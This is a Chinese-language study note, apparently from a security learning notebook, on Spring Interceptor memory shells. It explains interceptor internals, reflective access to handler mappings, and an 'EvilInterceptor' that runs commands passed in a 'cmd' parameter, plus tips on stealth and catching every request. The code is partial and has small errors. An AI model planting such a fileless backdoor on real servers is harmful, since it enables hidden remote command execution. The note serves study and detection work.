---
title: 
description: 
tags: []
status: 
finish-date: 
difficulty: 
---

# Spring Interceptor型内存马

## 什么是Interceptor
>interceptor（拦截器）是Spring MVC提供的一个组件，类似于Servlet的Filter

**核心方法**

- `preHandle()`     Controller执行之前  返回false可以中断请求

- `postHandle()`    Controller执行之后，视图渲染之前    可以用来修改ModelAndView

- `afterCompletion()` 请求完全处理完之后    用于资源清理

*内存马中最常用的是 preHandle()，因为它可以在 Controller 执行之前拦截请求并执行恶意代码，甚至可以直接返回响应，让 Controller 不再执行*

**正常Interceptor写法**
```java
@Component
public class AuthInterceptor implements HandlerInterceptor {
    @Override
    public boolean preHandle(HttpServletRequest req, HttpServletResponse resp, Object handler) 
            throws Exception {
        // 权限检查逻辑
        if (req.getSession().getAttribute("user") == null) {
            resp.sendRedirect("/login");
            return false;
        }
        return true;
    }
}
```

**注册方式**
```java
@Configuration
public class WebConfig implements WebMvcConfigurer {
    @Override
    public void addInterceptors(InterceptorRegistry registry) {
        registry.addInterceptor(new AuthInterceptor())
                .addPathPatterns("/admin/**");
    }
}
```

## Interceptor型内存马的核心思路
>在web应用运行时，利用代码执行入口，获取Spring的InterceptorRegistery，动态注册一个HandlerInterceptor，使其在请求到达Controller之前拦截请求并执行恶意代码

## Interceptor 型内存马的底层原理

**Interceptor 的存储结构**

>在 Spring 中，所有 Interceptor 都存储在 InterceptorRegistry 中
```
InterceptorRegistry
    └── registries (List<InterceptorRegistration>)
         └── InterceptorRegistration
              ├── interceptor (HandlerInterceptor 实例)
              ├── includePatterns (拦截的 URL 模式)
              └── excludePatterns (排除的 URL 模式)
```

**获取 InterceptorRegistry 的方式**

*方式一：通过 WebMvcConfigurer（静态配置）*
```
@Configuration
public class WebConfig implements WebMvcConfigurer {
    @Override
    public void addInterceptors(InterceptorRegistry registry) {
        // 这里可以获取 registry
    }
}
```

*通过 AbstractHandlerMapping 反射获取（动态注入用这个）*

Spring 的 AbstractHandlerMapping 中有一个 interceptors 字段，类型为 InterceptingHandlerExecutionChain，包含所有拦截器配置。

更直接的方式是从 RequestMappingHandlerMapping 中获取拦截器列表
```
RequestMappingHandlerMapping handlerMapping = 
    context.getBean(RequestMappingHandlerMapping.class);

// 通过反射获取 interceptors 字段
Field interceptorsField = AbstractHandlerMapping.class
    .getDeclaredField("interceptors");
interceptorsField.setAccessible(true);
Object interceptors = interceptorsField.get(handlerMapping);
// 这个对象的类型是 InterceptingHandlerExecutionChain
```

## 完整注入流程

**获取 Spring 上下文**
```
WebApplicationContext ct=(WebApplicationContext)request.getServletContext().getAttribute(WebApplicationContext.ROOT_WEB_APPLICATION_CONTEXT_ATTRIBUTE);
```

**获取 HandlerMapping**

```java
RequestMappingHandlerMapping handlerMapping=context.getBean(RequestContextHandlerMapping.class)
```

**通过反射获取 Interceptor 注册器**

```java
Field interceptorsField = AbstractHandlerMapping.class.getDeclaredField("interceptors");
interceptorsField.setAccessible(true);
Object interceptors=interceptorsField.get(handlerMapping);
```

**创建恶意 Interceptor**

```
class EvilInterceptor implements HandlerInterceptor{
    @Override
    public boolean preHandle(HttpServletRequest req,HttpServletResponse res,Object handler) throws Exception{
        String cmd=req.getParameter("cmd");
        if(cmd!=null&&!cmd.isEmpty()){
            Process p=Runtime.getRuntime().exec(cmd);
            PrintWriter out=res.getWriter();
            return false;
        }
        return true;
    }

}
```

**动态注册**



**完整POC**
[](../../../code-attachment/memory-shell-code/minidemo/Spring-Interceptor.jsp)

## 核心流程图
```
用户访问任意路径 ?cmd=whoami
    ↓
DispatcherServlet 接收请求
    ↓
执行所有 Interceptor 的 preHandle()
    ↓
发现恶意 Interceptor → 执行 EvilInterceptor.preHandle()
    ↓
检测到 cmd 参数 → 执行命令并返回结果
    ↓
返回 false → 中断请求，不再执行 Controller
```

## 与 Controller 型的对比

| 维度 | Spring Controller 型 | Spring Interceptor 型 |
|------|----------------------|------------------------|
| 注册对象 | `@Controller` 方法 | `HandlerInterceptor` |
| 注册方式 | `registerMapping()` | 向 `InterceptorRegistry` 添加 |
| 触发时机 | 请求到达 Controller 时 | Controller 执行之前 |
| URL 绑定 | 绑定特定路径 | 绑定路径模式（支持 `/*`、`/admin/**`） |
| 拦截范围 | 只有匹配的 URL | 可以拦截所有请求 |
| 中断能力 | 无法中断 | 可以中断（返回 `false`） |
| 隐蔽性 | 高 | 更高（可以拦截所有请求） |
| 代码复杂度 | 低 | 较高（需要反射操作） |

## 实战要点

- 拦截范围	建议用 /* 拦截所有请求，这样任意路径都能触发

- 中断请求	preHandle() 返回 false，Controller 不会执行

- 回显	直接在 preHandle() 中通过 response 输出

- 版本兼容	Spring 4.x 和 5.x 的拦截器注册方式略有不同

- 检测难度	高——Interceptor 是正常的 Spring 组件，难以区分

## 优势与局限性
**优势**

- 拦截所有请求	可以拦截 /*，任何请求都能触发

- 完全融入 Spring	是 Spring 的正常组件，不易察觉

- 可中断请求	返回 false 可以让 Controller 不执行

- 无固定路径	不像 Controller 那样有固定 URL

**局限性**

- 注册较复杂	需要通过反射操作 InterceptorRegistry

- 版本差异	Spring 不同版本的内部结构不同

- 需要 Spring 环境	不支持非 Spring 应用

## 一句话总结
>Spring Interceptor 型内存马的本质是：利用代码执行入口，通过反射获取 Spring 的 InterceptorRegistry，在运行时动态注册一个恶意 HandlerInterceptor，使其在请求进入 Controller 之前拦截所有（或部分）请求，执行恶意代码并可选地中断请求，实现无文件后门。





